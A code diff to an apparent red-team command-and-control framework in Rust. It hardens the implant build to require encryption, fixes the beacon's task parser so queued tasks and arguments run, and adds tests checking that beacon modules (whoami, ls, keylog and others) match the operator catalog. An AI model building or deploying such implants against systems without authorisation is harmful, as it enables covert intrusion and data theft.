@@ -129,15 +129,21 @@ rand = "0.8"
         .status()
         .map_err(|e| anyhow!("ANUBIS_AGENT_CARGO: {e}"))?;
     if !status.success() {
-        // Fallback: try rustc-only cleartext build of a simplified agent
-        return build_agent_rustc_fallback(src, bin_path);
+        // Fail closed: do not fall back to a cleartext/rustc agent when cargo
+        // cannot build the encrypted aop-2 agent (aes-gcm required).
+        return Err(anyhow!(
+            "ANUBIS_AGENT_BUILD_FAILED: cargo release build failed for agent `{name}` (no cleartext rustc fallback)"
+        ));
     }
     let built = proj
         .join("target/release")
         .join(format!("anubis_agent_{name}"));
     // Windows would be .exe — macOS/linux as-is
     if !built.exists() {
-        return build_agent_rustc_fallback(src, bin_path);
+        return Err(anyhow!(
+            "ANUBIS_AGENT_BUILD_FAILED: release binary missing at {} (no cleartext rustc fallback)",
+            built.display()
+        ));
     }
     fs::copy(&built, bin_path)?;
     #[cfg(unix)]
@@ -146,36 +152,6 @@ rand = "0.8"
         let mut perms = fs::metadata(bin_path)?.permissions();
         perms.set_mode(0o755);
         fs::set_permissions(bin_path, perms)?;
-    }
-    Ok(())
-}
-
-fn build_agent_rustc_fallback(src: &str, bin_path: &Path) -> Result<()> {
-    // Strip encrypt paths if compile fails — use simplified template
-    let simple = src
-        .replace("use aes_gcm", "// use aes_gcm")
-        .replace("encrypt_mode", "false");
-    let tmp = bin_path.with_extension("rs");
-    fs::write(
-        &tmp,
-        if src.contains("aes_gcm") {
-            src
-        } else {
-            &simple
-        },
-    )?;
-    // Prefer original; if agent uses aes-gcm, cargo path is required
-    let status = Command::new("rustc")
-        .arg(&tmp)
-        .arg("-O")
-        .arg("-o")
-        .arg(bin_path)
-        .status()
-        .map_err(|e| anyhow!("ANUBIS_AGENT_RUSTC: {e}"))?;
-    if !status.success() {
-        return Err(anyhow!(
-            "ANUBIS_AGENT_BUILD_FAILED: cargo and rustc both failed for agent"
-        ));
     }
     Ok(())
 }
@@ -238,7 +214,9 @@ fn main() {
                 if let Some(tasks) = parse_tasks(&tasks_json) {
                     for (tid, module, args) in tasks {
                         let (ok, output) = run_module(&module, &args);
-                        let _ = post_result(&tid, &module, ok, &output);
+                        if let Err(e) = post_result(&tid, &module, ok, &output) {
+                            eprintln!("post_result error: tid={} module={} err={}", tid, module, e);
+                        }
                     }
                 }
             }
@@ -346,10 +324,10 @@ fn beacon(hostname: &str, arch: &str, pid: u32) -> Result<String, String> {
     };
     let resp = http_post("/beacon", &body)?;
     if ENCRYPT {
-        if let Some(blob) = extract_json_string(&resp, "blob") {
-            let pt = open(&blob)?;
-            return Ok(String::from_utf8_lossy(&pt).to_string());
-        }
+        let blob = extract_json_string(&resp, "blob")
+            .ok_or_else(|| format!("ANUBIS_AGENT_NO_BLOB: encrypted beacon response has no blob field (resp_len={})", resp.len()))?;
+        let pt = open(&blob)?;
+        return Ok(String::from_utf8_lossy(&pt).to_string());
     }
     Ok(resp)
 }
@@ -399,13 +377,65 @@ fn extract_json_string(json: &str, key: &str) -> Option<String> {
 }
 
 fn parse_tasks(json: &str) -> Option<Vec<(String, String, Vec<String>)>> {
+    // Standalone agent: no serde_json. Preserve task args from "args":[...].
     if !json.contains("\"tasks\"") { return Some(vec![]); }
     let mut out = Vec::new();
-    for chunk in json.split("\"id\"").skip(1) {
-        let id = extract_quoted_after_colon(chunk)?;
-        let rest = chunk.split("\"module\"").nth(1)?;
-        let module = extract_quoted_after_colon(rest)?;
-        out.push((id, module, Vec::new()));
+    // Split on the KEY token `"id":`, not the bare string `"id"`. A bare `"id"` also matches a
+    // VALUE — and `"module":"id"` is not hypothetical: the `id` recon module is the 4th of the
+    // five default tasks. That spurious split produced a chunk starting mid-value, whose
+    // `extract_quoted_after_colon` returned None, whose `?` then discarded the ENTIRE task list.
+    // Measured end to end in a disposable guest: the same five tasks returned 5/5 results with
+    // the `id` module swapped out, and 0/5 across all 50 polls with it in.
+    //
+    // Two defects, and only fixing the split would leave the worse one: `?` inside the loop made
+    // one malformed task silently zero every OTHER task, and the caller's `if let Some(tasks)`
+    // then treated "the payload was unparseable" as "the operator queued nothing". A C2 that
+    // reports no work when it cannot read its work is telling the operator something false.
+    // A malformed chunk is now skipped and named on stderr; the tasks that DID parse still run.
+    for chunk in json.split("\"id\":").skip(1) {
+        let Some(id) = extract_quoted_after_colon_key(chunk) else {
+            eprintln!("parse_tasks: skipping task chunk with unreadable id");
+            continue;
+        };
+        let Some(module) = chunk
+            .split("\"module\":")
+            .nth(1)
+            .and_then(extract_quoted_after_colon_key)
+        else {
+            eprintln!("parse_tasks: skipping task id={id} with unreadable module");
+            continue;
+        };
+        let args = extract_string_array_after_key(chunk, "args").unwrap_or_default();
+        out.push((id, module, args));
+    }
+    Some(out)
+}
+
+/// Read the quoted string that a `"key":` split has already positioned us after.
+/// `extract_quoted_after_colon` expects to find and step over a `:` itself; splitting on the key
+/// token WITH its colon means the colon is already consumed, so this takes the next quoted run.
+fn extract_quoted_after_colon_key(s: &str) -> Option<String> {
+    let start = s.find('"')? + 1;
+    let rest = &s[start..];
+    let end = rest.find('"')?;
+    Some(rest[..end].to_string())
+}
+
+fn extract_string_array_after_key(s: &str, key: &str) -> Option<Vec<String>> {
+    let pat = format!("\"{}\"", key);
+    let idx = s.find(&pat)?;
+    let after = &s[idx + pat.len()..];
+    let after = after.trim_start_matches(|c: char| c == ' ' || c == ':' || c == '\t');
+    let start = after.find('[')?;
+    let rest = &after[start + 1..];
+    let end = rest.find(']')?;
+    let inner = &rest[..end];
+    let mut out = Vec::new();
+    for part in inner.split(',') {
+        let p = part.trim();
+        if p.is_empty() { continue; }
+        let p = p.trim_matches('"');
+        if !p.is_empty() { out.push(p.to_string()); }
     }
     Some(out)
 }
@@ -471,4 +501,254 @@ fn run_cmd(cmd: &str, args: &[String]) -> (bool, String) {
         .replace("__KEY_ID__", key_id)
         .replace("__ENCRYPT__", if encrypt { "true" } else { "false" })
         .replace("__UDS__", uds_path)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::super::modules;
+    use super::*;
+
+    #[test]
+    fn render_agent_source_substitutes_all_placeholders() {
+        let src = render_agent_source(&AgentRenderParams {
+            agent_id: "agt-test123",
+            engagement_id: "eng-unit",
+            c2_bind: "127.0.0.1:9999",
+            sleep_ms: 500,
+            jitter_pct: 10,
+            os: "darwin",
+            psk_hex: "aabbccdd",
+            key_id: "kid-01",
+            encrypt: true,
+            uds_path: "/tmp/test.sock",
+        });
+        assert!(src.contains("\"agt-test123\""), "missing agent_id");
+        assert!(src.contains("\"eng-unit\""), "missing engagement_id");
+        assert!(src.contains("\"127.0.0.1:9999\""), "missing c2_bind");
+        assert!(src.contains("500"), "missing sleep_ms");
+        assert!(src.contains("\"darwin\""), "missing os");
+        assert!(src.contains("\"aabbccdd\""), "missing psk_hex");
+        assert!(src.contains("\"kid-01\""), "missing key_id");
+        assert!(src.contains("true"), "missing encrypt");
+        assert!(!src.contains("__AGENT_ID__"), "unsubstituted __AGENT_ID__");
+        assert!(!src.contains("__C2__"), "unsubstituted __C2__");
+        assert!(!src.contains("__PSK__"), "unsubstituted __PSK__");
+        assert!(!src.contains("__OS__"), "unsubstituted __OS__");
+    }
+
+    /// Dispatch arms the beacon accepts but the operator catalog does not publish.
+    /// Every entry needs a reason. Recorded rather than deleted: an undocumented
+    /// dispatch arm is a capability the operator cannot see in `anubis aop modules`.
+    const UNPUBLISHED_DISPATCH_ALIASES: &[(&str, &str)] =
+        &[("exit", "benign alias for the published `die` module")];
+
+    /// Extract the module names `run_module` matches on, from the rendered beacon
+    /// source. `run_module` lives inside a raw-string template, so the compiler
+    /// cannot check it against the catalog — this reads the same text that is
+    /// compiled into the beacon, so it cannot drift from what actually ships.
+    fn dispatched_modules(src: &str) -> Vec<String> {
+        let start = src
+            .find("fn run_module(")
+            .expect("beacon template no longer defines run_module");
+        // The catch-all arm terminates the match; it is the only place this
+        // string appears and it bounds the arm list exactly.
+        let end = src[start..]
+            .find("unknown module:")
+            .map(|i| start + i)
+            .expect("run_module lost its catch-all arm — dispatch is no longer total");
+
+        let mut names = Vec::new();
+        for line in src[start..end].lines() {
+            let line = line.trim();
+            let Some(arrow) = line.find("=>") else {
+                continue;
+            };
+            let pattern = &line[..arrow];
+            if !pattern.trim_start().starts_with('"') {
+                continue; // binding arm (`other =>`) or not an arm at all
+            }
+            for alt in pattern.split('|') {
+                let alt = alt.trim();
+                if let Some(name) = alt.strip_prefix('"').and_then(|s| s.strip_suffix('"')) {
+                    names.push(name.to_string());
+                }
+            }
+        }
+        assert!(
+            !names.is_empty(),
+            "parsed zero dispatch arms — the extractor broke, not the code under test"
+        );
+        names
+    }
+
+    /// The parity predicate itself, pulled out so it can be poison-tested against a
+    /// synthetic pair. A test that has never been red has not been shown to test
+    /// anything; the real tests below pass on today's tree, so the evidence that
+    /// they *would* catch a break comes from `poison_*` rather than from planting a
+    /// fake arm in the shipped template.
+    fn catalog_entries_without_dispatch<'a>(
+        catalog_agent_names: &[&'a str],
+        dispatched: &[String],
+    ) -> Vec<&'a str> {
+        catalog_agent_names
+            .iter()
+            .copied()
+            .filter(|n| !dispatched.iter().any(|d| d == n))
+            .collect()
+    }
+
+    fn dispatch_arms_not_published(published: &[&str], dispatched: &[String]) -> Vec<String> {
+        dispatched
+            .iter()
+            .filter(|d| {
+                !published.iter().any(|p| p == &d.as_str())
+                    && !UNPUBLISHED_DISPATCH_ALIASES
+                        .iter()
+                        .any(|(alias, _)| alias == &d.as_str())
+            })
+            .cloned()
+            .collect()
+    }
+
+    #[test]
+    fn poison_catalog_entry_without_dispatch_is_detected() {
+        let dispatched = vec!["whoami".to_string(), "ls".to_string()];
+        let missing = catalog_entries_without_dispatch(&["whoami", "ls", "screenshot"], &dispatched);
+        assert_eq!(
+            missing,
+            vec!["screenshot"],
+            "the parity predicate must flag a published module with no dispatch arm"
+        );
+        // and must not cry wolf when they agree
+        assert!(
+            catalog_entries_without_dispatch(&["whoami", "ls"], &dispatched).is_empty(),
+            "over-rejection: agreeing lists must produce no finding"
+        );
+    }
+
+    #[test]
+    fn poison_unpublished_dispatch_arm_is_detected() {
+        let dispatched = vec!["whoami".to_string(), "keylog".to_string()];
+        assert_eq!(
+            dispatch_arms_not_published(&["whoami"], &dispatched),
+            vec!["keylog".to_string()],
+            "the parity predicate must flag a dispatch arm the catalog does not publish"
+        );
+        // `exit` is excused by UNPUBLISHED_DISPATCH_ALIASES and must NOT be flagged
+        assert!(
+            dispatch_arms_not_published(&["whoami"], &["exit".to_string()]).is_empty(),
+            "a recorded alias must not be reported as undocumented"
+        );
+    }
+
+    /// The extractor is the instrument. If it silently returned an empty or partial
+    /// list, both parity tests would pass vacuously — the failure mode that made
+    /// "244/244 PASS" mean zero fixtures actually ran.
+    #[test]
+    fn poison_extractor_reads_arms_it_is_given() {
+        let synthetic = r#"
+            fn run_module(module: &str, args: &[String]) -> (bool, String) {
+                match module {
+                    "alpha" => run_cmd("alpha", &[]),
+                    "beta" | "gamma" => run_cmd("beta", &[]),
+                    other => (false, format!("unknown module: {}", other)),
+                }
+            }
+        "#;
+        assert_eq!(
+            dispatched_modules(synthetic),
+            vec![
+                "alpha".to_string(),
+                "beta".to_string(),
+                "gamma".to_string()
+            ],
+            "extractor must read every arm including alternates, and stop at the catch-all"
+        );
+    }
+
+    fn rendered_beacon_source() -> String {
+        render_agent_source(&AgentRenderParams {
+            agent_id: "agt-parity",
+            engagement_id: "eng-parity",
+            c2_bind: "127.0.0.1:9999",
+            sleep_ms: 500,
+            jitter_pct: 10,
+            os: "darwin",
+            psk_hex: "aabbccdd",
+            key_id: "kid-01",
+            encrypt: true,
+            uds_path: "/tmp/parity.sock",
+        })
+    }
+
+    /// CLAIMS-19: the module catalog (producer) and the beacon's `run_module`
+    /// (consumer) enumerate independently. The listener validates a task name
+    /// against the catalog, so an unpublished name is refused — but nothing
+    /// proved the beacon can actually RUN what the catalog publishes. A catalog
+    /// entry with no dispatch arm is a false capability claim: the operator sees
+    /// the module listed, tasks it, and the beacon answers "unknown module".
+    #[test]
+    fn every_catalog_agent_module_is_dispatchable_by_the_beacon() {
+        let src = rendered_beacon_source();
+        let dispatched = dispatched_modules(&src);
+        let catalog = modules::catalog();
+        let agent_names: Vec<&str> = catalog
+            .iter()
+            .filter(|m| m.side == "agent")
+            .map(|m| m.name)
+            .collect();
+        let missing = catalog_entries_without_dispatch(&agent_names, &dispatched);
+        assert!(
+            missing.is_empty(),
+            "CLAIMS-19: catalog publishes agent module(s) {:?} but the beacon's \
+             run_module has no arm for them. The listener will ACCEPT the task \
+             (it validates against this same catalog) and the beacon will answer \
+             \"unknown module\". Either add the dispatch arm or drop the catalog \
+             entry. Dispatched arms: {:?}",
+            missing,
+            dispatched,
+        );
+    }
+
+    /// The other direction. An arm the catalog does not publish is a capability
+    /// the operator cannot discover, and one `map_action` will not classify — so
+    /// it would land in a purple report as an unmapped action.
+    #[test]
+    fn every_beacon_dispatch_arm_is_published_or_recorded() {
+        let src = rendered_beacon_source();
+        let dispatched = dispatched_modules(&src);
+        let catalog = modules::catalog();
+        let agent_names: Vec<&str> = catalog
+            .iter()
+            .filter(|m| m.side == "agent")
+            .map(|m| m.name)
+            .collect();
+        let undocumented = dispatch_arms_not_published(&agent_names, &dispatched);
+        assert!(
+            undocumented.is_empty(),
+            "CLAIMS-19: beacon dispatches {:?} but the catalog does not publish \
+             them and they are not in UNPUBLISHED_DISPATCH_ALIASES. Undocumented \
+             dispatch is an invisible capability. Publish it in modules.rs, or add \
+             it to the alias list with a reason.",
+            undocumented,
+        );
+    }
+
+    /// Guards the allow-list itself: a stale alias must not sit there forever
+    /// pretending to excuse an arm that no longer exists.
+    #[test]
+    fn unpublished_alias_list_has_no_stale_entries() {
+        let src = rendered_beacon_source();
+        let dispatched = dispatched_modules(&src);
+        for (alias, reason) in UNPUBLISHED_DISPATCH_ALIASES {
+            assert!(
+                dispatched.iter().any(|d| d == alias),
+                "stale exemption: `{}` ({}) is excused in \
+                 UNPUBLISHED_DISPATCH_ALIASES but the beacon no longer dispatches \
+                 it — remove the entry",
+                alias,
+                reason,
+            );
+        }
+    }
 }
